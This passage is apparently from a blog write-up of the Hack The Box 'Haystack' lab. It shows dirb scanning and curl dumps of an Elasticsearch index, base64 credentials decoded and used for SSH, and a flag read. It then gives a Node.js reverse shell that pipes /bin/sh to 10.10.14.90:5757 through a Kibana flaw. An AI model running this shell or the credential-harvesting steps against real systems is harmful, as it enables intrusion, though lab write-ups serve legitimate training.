class="CodeMirror-linenumber">38</span><span class="CodeMirror-linenumber">39</span><span class="CodeMirror-linenumber">40</span><span class="CodeMirror-linenumber">41</span><span class="CodeMirror-linenumber">42</span><span class="CodeMirror-linenumber">43</span><span class="CodeMirror-linenumber">44</span><span class="CodeMirror-linenumber">45</span><span class="CodeMirror-linenumber">46</span><span class="CodeMirror-linenumber">47</span><span class="CodeMirror-linenumber">48</span><span class="CodeMirror-linenumber">49</span><span class="CodeMirror-linenumber">50</span><span class="CodeMirror-linenumber">51</span><span class="CodeMirror-linenumber">52</span><span class="CodeMirror-linenumber">53</span><span class="CodeMirror-linenumber">54</span><span class="CodeMirror-linenumber">55</span><span class="CodeMirror-linenumber">56</span><span class="CodeMirror-linenumber">57</span><span class="CodeMirror-linenumber">58</span><span class="CodeMirror-linenumber">59</span><span class="CodeMirror-linenumber">60</span><span class="CodeMirror-linenumber">61</span><span class="CodeMirror-linenumber">62</span><span class="CodeMirror-linenumber">63</span><span class="CodeMirror-linenumber">64</span><span class="CodeMirror-linenumber">65</span><span class="CodeMirror-linenumber">66</span><span class="CodeMirror-linenumber">67</span><span class="CodeMirror-linenumber">68</span><span class="CodeMirror-linenumber">69</span><span class="CodeMirror-linenumber">70</span><span class="CodeMirror-linenumber">71</span><span class="CodeMirror-linenumber">72</span><span class="CodeMirror-linenumber">73</span><span class="CodeMirror-linenumber">74</span><span class="CodeMirror-linenumber">75</span><span class="CodeMirror-linenumber">76</span><span class="CodeMirror-linenumber">77</span><span class="CodeMirror-linenumber">78</span><span class="CodeMirror-linenumber">79</span><span class="CodeMirror-linenumber">80</span><span class="CodeMirror-linenumber">81</span><span class="CodeMirror-linenumber">82</span><span class="CodeMirror-linenumber">83</span><span class="CodeMirror-linenumber">84</span><span class="CodeMirror-linenumber">85</span><span class="CodeMirror-linenumber">86</span><span class="CodeMirror-linenumber">87</span><span class="CodeMirror-linenumber">88</span><span class="CodeMirror-linenumber">89</span><span class="CodeMirror-linenumber">90</span><span class="CodeMirror-linenumber">91</span><span class="CodeMirror-linenumber">92</span><span class="CodeMirror-linenumber">93</span><span class="CodeMirror-linenumber">94</span><span class="CodeMirror-linenumber">95</span><span class="CodeMirror-linenumber">96</span><span class="CodeMirror-linenumber">97</span><span class="CodeMirror-linenumber">98</span><span class="CodeMirror-linenumber">99</span><span class="CodeMirror-linenumber">100</span><span class="CodeMirror-linenumber">101</span><span class="CodeMirror-linenumber">102</span><span class="CodeMirror-linenumber">103</span><span class="CodeMirror-linenumber">104</span></span>
+        <code class="">╰─$ dirb http://10.10.10.115:9200
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sun Sep  8 19:34:45 2019
+URL_BASE: http://10.10.10.115:9200/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.10.115:9200/ ----
++ http://10.10.10.115:9200/.git/HEAD (CODE:405|SIZE:101)                                                                             
++ http://10.10.10.115:9200/.svn/entries (CODE:405|SIZE:104)                                                                          
++ http://10.10.10.115:9200/_ (CODE:400|SIZE:301)                                                                                     
++ http://10.10.10.115:9200/_adm (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_admin (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_ajax (CODE:400|SIZE:317)                                                                                 
++ http://10.10.10.115:9200/_archive (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_assets (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_backup (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_baks (CODE:400|SIZE:317)                                                                                 
++ http://10.10.10.115:9200/_borders (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_cache (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_catalogs (CODE:400|SIZE:333)                                                                             
++ http://10.10.10.115:9200/_code (CODE:400|SIZE:317)                                                                                 
++ http://10.10.10.115:9200/_common (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_conf (CODE:400|SIZE:317)                                                                                 
++ http://10.10.10.115:9200/_config (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_css (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_data (CODE:400|SIZE:317)                                                                                 
++ http://10.10.10.115:9200/_database (CODE:400|SIZE:333)                                                                             
++ http://10.10.10.115:9200/_db_backups (CODE:400|SIZE:341)                                                                           
++ http://10.10.10.115:9200/_derived (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_dev (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_dummy (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_files (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_flash (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_fpclass (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_images (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_img (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_inc (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_include (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_includes (CODE:400|SIZE:333)                                                                             
++ http://10.10.10.115:9200/_install (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_js (CODE:400|SIZE:309)                                                                                   
++ http://10.10.10.115:9200/_layouts (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_lib (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_media (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_mem_bin (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_mm (CODE:400|SIZE:309)                                                                                   
++ http://10.10.10.115:9200/_mmserverscripts (CODE:400|SIZE:361)                                                                      
++ http://10.10.10.115:9200/_mygallery (CODE:400|SIZE:337)                                                                            
++ http://10.10.10.115:9200/_net (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_notes (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_old (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_overlay (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_pages (CODE:400|SIZE:321)                                                                                
++ http://10.10.10.115:9200/_private (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_reports (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_res (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_resources (CODE:400|SIZE:337)                                                                            
++ http://10.10.10.115:9200/_scriptlibrary (CODE:400|SIZE:353)                                                                        
++ http://10.10.10.115:9200/_scripts (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_source (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_src (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_stats (CODE:200|SIZE:16674)                                                                              
++ http://10.10.10.115:9200/_styles (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_swf (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_temp (CODE:400|SIZE:317)                                                                                 
++ http://10.10.10.115:9200/_tempalbums (CODE:400|SIZE:341)                                                                           
++ http://10.10.10.115:9200/_template (CODE:200|SIZE:40327)                                                                           
++ http://10.10.10.115:9200/_templates (CODE:400|SIZE:337)                                                                            
++ http://10.10.10.115:9200/_test (CODE:400|SIZE:317)                                                                                 
++ http://10.10.10.115:9200/_themes (CODE:400|SIZE:325)                                                                               
++ http://10.10.10.115:9200/_tmp (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/_tmpfileop (CODE:400|SIZE:337)                                                                            
++ http://10.10.10.115:9200/_vti_aut (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_bin (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_bin/shtml.dll (CODE:405|SIZE:110)                                                                    
++ http://10.10.10.115:9200/_vti_cnf (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_inf (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_log (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_map (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_pvt (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_rpc (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_vti_script (CODE:400|SIZE:341)                                                                           
++ http://10.10.10.115:9200/_vti_txt (CODE:400|SIZE:329)                                                                              
++ http://10.10.10.115:9200/_www (CODE:400|SIZE:313)                                                                                  
++ http://10.10.10.115:9200/bank (CODE:200|SIZE:1010)                                                                                 
++ http://10.10.10.115:9200/CVS/Entries (CODE:405|SIZE:103)                                                                           
++ http://10.10.10.115:9200/CVS/Repository (CODE:405|SIZE:106)                                                                        
++ http://10.10.10.115:9200/CVS/Root (CODE:405|SIZE:100)                                                                              
++ http://10.10.10.115:9200/favicon.ico (CODE:200|SIZE:1529)                                                                          
++ http://10.10.10.115:9200/quotes (CODE:200|SIZE:338)                                                                                
+                                                                                                                                     
+-----------------
+END_TIME: Sun Sep  8 19:38:49 2019
+DOWNLOADED: 4612 - FOUND: 83
+
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="447">Dumping the quotes:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="448">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span><span class="CodeMirror-linenumber">15</span><span class="CodeMirror-linenumber">16</span><span class="CodeMirror-linenumber">17</span><span class="CodeMirror-linenumber">18</span><span class="CodeMirror-linenumber">19</span><span class="CodeMirror-linenumber">20</span><span class="CodeMirror-linenumber">21</span><span class="CodeMirror-linenumber">22</span><span class="CodeMirror-linenumber">23</span><span class="CodeMirror-linenumber">24</span><span class="CodeMirror-linenumber">25</span><span class="CodeMirror-linenumber">26</span><span class="CodeMirror-linenumber">27</span><span class="CodeMirror-linenumber">28</span><span class="CodeMirror-linenumber">29</span><span class="CodeMirror-linenumber">30</span><span class="CodeMirror-linenumber">31</span><span class="CodeMirror-linenumber">32</span><span class="CodeMirror-linenumber">33</span><span class="CodeMirror-linenumber">34</span><span class="CodeMirror-linenumber">35</span><span class="CodeMirror-linenumber">36</span><span class="CodeMirror-linenumber">37</span><span class="CodeMirror-linenumber">38</span><span class="CodeMirror-linenumber">39</span><span class="CodeMirror-linenumber">40</span><span class="CodeMirror-linenumber">41</span><span class="CodeMirror-linenumber">42</span><span class="CodeMirror-linenumber">43</span><span class="CodeMirror-linenumber">44</span><span class="CodeMirror-linenumber">45</span><span class="CodeMirror-linenumber">46</span><span class="CodeMirror-linenumber">47</span><span class="CodeMirror-linenumber">48</span><span class="CodeMirror-linenumber">49</span><span class="CodeMirror-linenumber">50</span><span class="CodeMirror-linenumber">51</span><span class="CodeMirror-linenumber">52</span><span class="CodeMirror-linenumber">53</span><span class="CodeMirror-linenumber">54</span><span class="CodeMirror-linenumber">55</span><span class="CodeMirror-linenumber">56</span><span class="CodeMirror-linenumber">57</span><span class="CodeMirror-linenumber">58</span><span class="CodeMirror-linenumber">59</span><span class="CodeMirror-linenumber">60</span><span class="CodeMirror-linenumber">61</span><span class="CodeMirror-linenumber">62</span><span class="CodeMirror-linenumber">63</span><span class="CodeMirror-linenumber">64</span><span class="CodeMirror-linenumber">65</span><span class="CodeMirror-linenumber">66</span><span class="CodeMirror-linenumber">67</span><span class="CodeMirror-linenumber">68</span><span class="CodeMirror-linenumber">69</span><span class="CodeMirror-linenumber">70</span><span class="CodeMirror-linenumber">71</span><span class="CodeMirror-linenumber">72</span><span class="CodeMirror-linenumber">73</span><span class="CodeMirror-linenumber">74</span><span class="CodeMirror-linenumber">75</span><span class="CodeMirror-linenumber">76</span><span class="CodeMirror-linenumber">77</span><span class="CodeMirror-linenumber">78</span><span class="CodeMirror-linenumber">79</span><span class="CodeMirror-linenumber">80</span><span class="CodeMirror-linenumber">81</span><span class="CodeMirror-linenumber">82</span><span class="CodeMirror-linenumber">83</span><span class="CodeMirror-linenumber">84</span><span class="CodeMirror-linenumber">85</span><span class="CodeMirror-linenumber">86</span><span class="CodeMirror-linenumber">87</span><span class="CodeMirror-linenumber">88</span><span class="CodeMirror-linenumber">89</span><span class="CodeMirror-linenumber">90</span><span class="CodeMirror-linenumber">91</span><span class="CodeMirror-linenumber">92</span><span class="CodeMirror-linenumber">93</span><span class="CodeMirror-linenumber">94</span><span class="CodeMirror-linenumber">95</span><span class="CodeMirror-linenumber">96</span><span class="CodeMirror-linenumber">97</span><span class="CodeMirror-linenumber">98</span><span class="CodeMirror-linenumber">99</span><span class="CodeMirror-linenumber">100</span><span class="CodeMirror-linenumber">101</span><span class="CodeMirror-linenumber">102</span><span class="CodeMirror-linenumber">103</span><span class="CodeMirror-linenumber">104</span><span class="CodeMirror-linenumber">105</span><span class="CodeMirror-linenumber">106</span><span class="CodeMirror-linenumber">107</span><span class="CodeMirror-linenumber">108</span></span>
+        <code class="">╰─$ curl -XPOST '10.10.10.115:9200/quotes/_search?pretty' 
+{
+  "took" : 1,
+  "timed_out" : false,
+  "_shards" : {
+    "total" : 5,
+    "successful" : 5,
+    "skipped" : 0,
+    "failed" : 0
+  },
+  "hits" : {
+    "total" : 253,
+    "max_score" : 1.0,
+    "hits" : [
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "14",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "En América se desarrollaron importantes civilizaciones, como Caral (la civilización más antigua de América, la cual se desarrolló en la zona central de Perú), los anasazi, los indios pueblo, quimbaya, nazca, chimú, chavín, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "19",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "Imperios español y portugués en 1790."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "22",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "También se instalaron en América del Sur repúblicas de pueblos de origen africano que lograron huir de la esclavitud a la que habían sido reducidos por los portugueses, como el Quilombo de los Palmares o el Quilombo de Macaco."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "24",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "En 1804, los esclavos de origen africano de Haití se sublevaron contra los colonos franceses, declarando la independencia de este país y creando el primer estado moderno con gobernantes afroamericanos."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "25",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "A partir de 1809,23​ los pueblos bajo dominio de España llevaron adelante una Guerra de Independencia Hispanoamericana, de alcance continental, que llevó, luego de complejos procesos, al surgimiento de varias naciones: Argentina, Bolivia, Colombia, Costa Rica, Panamá, Chile, Ecuador, El Salvador, Guatemala, Honduras, México, Nicaragua, Paraguay, Perú, Uruguay y Venezuela. En 1844 y 1898 el proceso se completaría con la independencia de República Dominicana y Cuba, respectivamente."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "26",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "En 1816, se conformó un enorme estado independiente sudamericano, denominado Gran Colombia, y que abarcó los territorios de los actuales Panamá, Colombia, Venezuela y Ecuador y zonas de Brasil, Costa Rica, Guyana, Honduras, Nicaragua y Perú. La República se disolvió en 1830."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "29",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "Tras su emancipación los países de América han seguido un desarrollo dispar entre sí. Durante el siglo XIX, Estados Unidos se afianzó como una potencia de carácter mundial y reemplazó a Europa como poder dominante en la región."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "40",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "En América Central, los ríos son cortos y corresponden principalmente a la vertiente atlántica. Estos ríos cumplen varias funciones, sirviendo incluso como fronteras; tal es el caso de los ríos Segovia o Coco (entre Honduras y Nicaragua), el río Lempa (Guatemala, El Salvador y Honduras) y el río San Juan (entre Costa Rica y Nicaragua). En esta zona, los lagos también son de menor extensión, destacando los lagos Nicaragua, Managua y Gatún, este último, construido por el hombre, ubicado en el Canal de Panamá, al cual le proporciona el agua necesaria para que los barcos salven las diferencias de nivel."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "41",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "Ya en América del Sur, reaparece la vertiente del Pacífico, aun cuando los ríos de la vertiente del Atlántico son más largos e importantes. Destacan en la parte sur del continente los ríos Orinoco, el sistema Paraná-Río de la Plata y el Amazonas. El río Amazonas es el río más caudaloso y más largo del mundo, y forma la cuenca hidrográfica más grande del planeta. Dentro de los lagos más importantes de América del Sur se cuenta con el lago de Maracaibo, el Titicaca, el Poopó y el Buenos Aires/General Carrera."
+        }
+      },
+      {
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "44",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "En cuanto a la flora de América del Norte, espacio en el cual se encuentran los Estados Unidos, Canadá y México, podemos encontrar pino, caoba, cedro, conifera, cactus, agave, en fin, más de 17 000 especies de plantas vasculares y más de 1,800 especies de plantas con flores.25​25"
+        }
+      }
+    ]
+  }
+}
+
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="559">Decided to use <a href="https://github.com/taskrabbit/elasticsearch-dump">https://github.com/taskrabbit/elasticsearch-dump</a> this program to dump the entire elasticsearch database.</p>
+<p data-line="561">After beautifying the .json file, I searched for anything important.</p>
+<p data-line="563">Found this:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="564">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span></span>
+        <code class="">{
+        "_index" : "quotes",
+        "_type" : "quote",
+        "_id" : "45",
+        "_score" : 1.0,
+        "_source" : {
+          "quote" : "Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "
+        }
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="575">The phrase translates to:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="576">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span></span>
+        <code class="">I have to save the key for the machine: dXNlcjogc2VjdXJpdHkg
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="580">Found another:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="581">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span></span>
+        <code class="">This key cannot be lost, I save it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="585">Base64 decoded is:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="586">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span></span>
+        <code class="">user: security 
+pass: spanish.is.key
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><h2 id="Got-User" data-line="591">Got User</h2>
+<p data-line="592">Try to SSH:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="593">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span></span>
+        <code class="">╰─$ ssh security@10.10.10.115
+security@10.10.10.115's password: 
+Last login: Sun Sep  8 20:43:35 2019 from 10.10.15.128
+[security@haystack ~]$ 
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="600">Success so read the user.txt:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="602">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span></span>
+        <code class="">[security@haystack ~]$ cat user.txt
+04d18bc79dac1d4d48ee0a940c8eb929
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="607"><a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a></p>
+<p data-line="609">Upgraded to reverse shell:</p>
+<pre class="code CodeMirror cm-s-dracula" data-line="610">        <span class="filename"></span>
+        <span class="lineNumber CodeMirror-gutters"><span class="CodeMirror-linenumber">1</span><span class="CodeMirror-linenumber">2</span><span class="CodeMirror-linenumber">3</span><span class="CodeMirror-linenumber">4</span><span class="CodeMirror-linenumber">5</span><span class="CodeMirror-linenumber">6</span><span class="CodeMirror-linenumber">7</span><span class="CodeMirror-linenumber">8</span><span class="CodeMirror-linenumber">9</span><span class="CodeMirror-linenumber">10</span><span class="CodeMirror-linenumber">11</span><span class="CodeMirror-linenumber">12</span><span class="CodeMirror-linenumber">13</span><span class="CodeMirror-linenumber">14</span></span>
+        <code class="">/usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../../../../tmp/.nh/shell.js -c /etc/kibana/kibana.yml
+
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+      var client = new net.Socket();
+      client.connect(5757, "10.10.14.90", function(){
+         client.pipe(sh.stdin);
+         sh.stdout.pipe(client);
+         sh.stderr.pipe(client);
+});
+return /a/;
+})();
+</code>
+      <i><button class="clipboardButton"><svg width="13" height="13" viewBox="0 0 1792 1792"><path d="M768 1664h896v-640h-416q-40 0-68-28t-28-68v-416h-384v1152zm256-1440v-64q0-13-9.5-22.5t-22.5-9.5h-704q-13 0-22.5 9.5t-9.5 22.5v64q0 13 9.5 22.5t22.5 9.5h704q13 0 22.5-9.5t9.5-22.5zm256 672h299l-299-299v299zm512 128v672q0 40-28 68t-68 28h-960q-40 0-68-28t-28-68v-160h-544q-40 0-68-28t-28-68v-1344q0-40 28-68t68-28h1088q40 0 68 28t28 68v328q21 13 36 28l408 408q28 28 48 76t20 88z"></path></svg></button></i></pre><p data-line="627">netstat -tulpn</p>
+</div></div></div></div>
+<!--footer code-->
+<footer>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://github.com/nadehi18"><i class="fab fa-github"></i></a>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://linkedin.com/in/nadehi18"><i class="fab fa-linkedin"></i></a>
+    <a class=footer-link target="_blank" rel="noopener noreferrer" href="https://twitter.com/nadehi18"><i class="fab fa-twitter"></i></a>
+</footer>
+<!-- end footer code-->
+</body>            </html>
